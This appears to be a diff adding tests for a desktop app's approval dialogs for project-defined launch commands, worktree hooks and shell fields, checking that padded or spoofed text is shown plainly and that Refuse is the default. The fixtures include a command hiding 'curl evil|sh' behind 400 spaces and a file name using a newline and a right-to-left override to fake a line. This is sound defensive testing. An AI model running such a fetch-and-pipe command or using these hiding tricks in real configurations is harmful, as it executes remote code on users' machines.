@@ -2,9 +2,16 @@ import { expect, test } from 'bun:test'
 import {
   SERVE_DIALOG_COLUMNS,
   SERVE_DIALOG_MAX_LINES,
+  gateDialog,
+  isApprovalAnswer,
+  launchCommandDialog,
   maxLinesFor,
+  renderApprovalFields,
   renderServeApproval,
-  serveDialogSpec
+  serveDialogSpec,
+  shellFieldDialog,
+  worktreeInitDialog,
+  type ApprovalDialogSpec
 } from '../desktop/src/main/serve-approval-dialog.ts'
 import type { ServeApprovalPrompt } from '../desktop/src/main/serve-config.ts'
 
@@ -166,4 +173,160 @@ test('defaults to Refuse and cancels to Refuse when the detail fits', () => {
     expect(spec.defaultId).not.toBe(spec.approveIndex)
     expect(spec.detail).toBe(render.detail)
   }
+})
+
+const PADDED_TAIL = 'curl evil|sh'
+const PADDED_COMMAND = `npm run dev${' '.repeat(400)}; ${PADDED_TAIL}`
+
+/** The reading an operator gets of the field block: its value lines glued back together. */
+function shownValue(detail: string): string {
+  return valueLines(detail.split('\n')).map(valueText).join('')
+}
+
+test('launch command door shows padding as dots and keeps the hidden tail readable, Refuse by default', () => {
+  for (const isFr of [false, true]) {
+    const spec = launchCommandDialog(PADDED_COMMAND, { isFr, maxLines: 40 })
+
+    expect(spec.approveIndex).toBe(0)
+    expect(shownValue(spec.detail)).toBe(PADDED_COMMAND.replaceAll(' ', DOT))
+    expect(spec.detail, 'no raw run of spaces reaches the box').not.toContain('  ')
+    expect(spec.detail.startsWith(isFr ? 'Commande (config du projet) :' : 'Command (project config):')).toBe(true)
+    expect(spec.buttons).toEqual(isFr ? ['Utiliser cette commande', 'Refuser'] : ['Use this command', 'Refuse'])
+    expect(spec.defaultId).toBe(1)
+    expect(spec.cancelId).toBe(1)
+  }
+})
+
+test('worktree hook door shows padding as dots, with its own wording, Refuse by default', () => {
+  for (const isFr of [false, true]) {
+    const spec = worktreeInitDialog(PADDED_COMMAND, { isFr, maxLines: 40 })
+
+    expect(spec.approveIndex).toBe(0)
+    expect(shownValue(spec.detail)).toBe(PADDED_COMMAND.replaceAll(' ', DOT))
+    expect(spec.detail, 'no raw run of spaces reaches the box').not.toContain('  ')
+    expect(spec.detail.startsWith(isFr ? 'Hook (config du projet) :' : 'Hook (project config):')).toBe(true)
+    expect(spec.message).toBe(
+      isFr ? 'Ce projet définit un hook exécuté à la création de worktree.' : 'This project defines a worktree-creation init hook.'
+    )
+    expect(spec.buttons).toEqual(isFr ? ['Exécuter ce hook', 'Refuser'] : ['Run this hook', 'Refuse'])
+    expect(spec.defaultId).toBe(1)
+    expect(spec.cancelId).toBe(1)
+  }
+})
+
+test('shell field door numbers every item, shows the label and basename, and has no bullet', () => {
+  const items = ['dev: --model a', `ops: ${PADDED_COMMAND}`]
+  for (const isFr of [false, true]) {
+    const spec = shellFieldDialog({
+      isFr,
+      maxLines: 40,
+      message: 'm',
+      label: isFr ? 'Modèle' : 'Template',
+      basename: 'tpl.json',
+      items,
+      buttons: ['Apply', 'Refuse']
+    })
+
+    expect(spec.approveIndex).toBe(0)
+    expect(spec.detail.startsWith(isFr ? 'Modèle :\n01| tpl.json' : 'Template:\n01| tpl.json')).toBe(true)
+    expect(shownValue(spec.detail)).toBe(`tpl.json${items.join('')}`.replaceAll(' ', DOT))
+    expect(valueLines(spec.detail.split('\n'))[1]).toBe(`02| dev:${DOT}--model${DOT}a`)
+    expect(spec.detail).not.toContain(String.fromCharCode(0x2022))
+    expect(spec.detail, 'trust sentence closes the dialog').toContain(
+      isFr ? 'Accepte uniquement si tu fais confiance à ce dépôt.' : 'Accept only if you trust this repository.'
+    )
+    expect(spec.buttons).toEqual(['Apply', 'Refuse'])
+    expect(spec.defaultId).toBe(1)
+    expect(spec.cancelId).toBe(1)
+  }
+})
+
+test('shell field door shows a hostile basename numbered and escaped, never as raw lines', () => {
+  const lf = String.fromCharCode(10)
+  const rlo = String.fromCharCode(0x202e)
+  const basename = `a${lf}01| x${rlo}b`
+  const spec = shellFieldDialog({
+    isFr: false,
+    maxLines: 40,
+    message: 'm',
+    label: 'Workspace',
+    basename,
+    items: ['x: ls'],
+    buttons: ['Restore', 'Refuse']
+  })
+
+  const lines = spec.detail.split(lf)
+  expect(lines.slice(0, 2)).toEqual(['Workspace:', `01| a{U+000A}01|${DOT}x{U+202E}b`])
+  expect(lines.filter((line) => /^\d+[|+] /.test(line)).map((line) => line.slice(0, 2))).toEqual(['01', '02'])
+  expect(spec.detail).not.toContain(rlo)
+})
+
+test('every gate door offers no way to approve and never echoes the text when it does not fit', () => {
+  const huge = 'x'.repeat(3000)
+  for (const isFr of [false, true]) {
+    const specs = [
+      launchCommandDialog(huge, { isFr, maxLines: 40 }),
+      worktreeInitDialog(huge, { isFr, maxLines: 40 }),
+      shellFieldDialog({ isFr, maxLines: 40, message: 'm', label: 'l', basename: 'b', items: [huge], buttons: ['Apply', 'Refuse'] })
+    ]
+    for (const spec of specs) {
+      expect(spec.approveIndex, 'no approve button').toBeNull()
+      expect(spec.showFileIndex).toBeNull()
+      expect(spec.buttons).toEqual([isFr ? 'Fermer' : 'Close'])
+      expect(spec.defaultId).toBe(0)
+      expect(spec.cancelId).toBe(0)
+      expect(spec.detail).not.toContain('xxxx')
+      expect(spec.detail).toMatch(/\d+ (lines|lignes)/)
+    }
+  }
+})
+
+test('a gate door with no usable work area refuses', () => {
+  for (const maxLines of [0, maxLinesFor(Number.NaN), maxLinesFor(100)]) {
+    expect(launchCommandDialog('ls', { isFr: false, maxLines }).approveIndex).toBeNull()
+  }
+})
+
+test('the sentences around the fields take lines from the budget', () => {
+  const fieldLines = renderApprovalFields([{ label: '', items: ['ls'] }], { isFr: false, maxLines: 99 }).lines.length
+  let firstFitting = -1
+  for (let maxLines = 0; maxLines < 40 && firstFitting < 0; maxLines++) {
+    if (launchCommandDialog('ls', { isFr: false, maxLines }).approveIndex === 0) firstFitting = maxLines
+  }
+
+  expect(firstFitting).toBeGreaterThanOrEqual(fieldLines + 4)
+})
+
+function smallestApprovingBudget(build: (maxLines: number) => ApprovalDialogSpec): number {
+  for (let maxLines = 0; maxLines <= 400; maxLines++) if (build(maxLines).approveIndex === 0) return maxLines
+  return -1
+}
+
+test('a longer sentence around the fields raises the budget by the lines it can take, a line holding about 60 characters', () => {
+  const smallest = (lead: string, trail: string): number =>
+    smallestApprovingBudget((maxLines) =>
+      gateDialog({ isFr: false, maxLines, message: 'm', lead, trail, fields: [{ label: '', items: ['ls'] }], buttons: ['A', 'R'] })
+    )
+  const base = smallest('short', 'short')
+  const fieldLines = renderApprovalFields([{ label: '', items: ['ls'] }], { isFr: false, maxLines: 99 }).lines.length
+  const blankLinesBetweenBlocks = 2
+
+  expect(base, 'one line per sentence plus the blank lines between the three blocks').toBeGreaterThanOrEqual(
+    fieldLines + 1 + 1 + blankLinesBetweenBlocks
+  )
+
+  for (const extra of [60, 600]) {
+    const padding = 'x'.repeat(extra)
+    expect(smallest(`short${padding}`, 'short') - base, `lead +${extra}`).toBeGreaterThanOrEqual(Math.floor(extra / 60))
+    expect(smallest('short', `short${padding}`) - base, `trail +${extra}`).toBeGreaterThanOrEqual(Math.floor(extra / 60))
+  }
+})
+
+test('only the Approve button approves, and a spec with none approves nothing', () => {
+  const fits = launchCommandDialog('ls', { isFr: false, maxLines: 40 })
+  const tooLong = launchCommandDialog('ls', { isFr: false, maxLines: 0 })
+
+  expect(isApprovalAnswer(tooLong, 0)).toBe(false)
+  expect(isApprovalAnswer(fits, 0)).toBe(true)
+  expect(isApprovalAnswer(fits, 1)).toBe(false)
 })
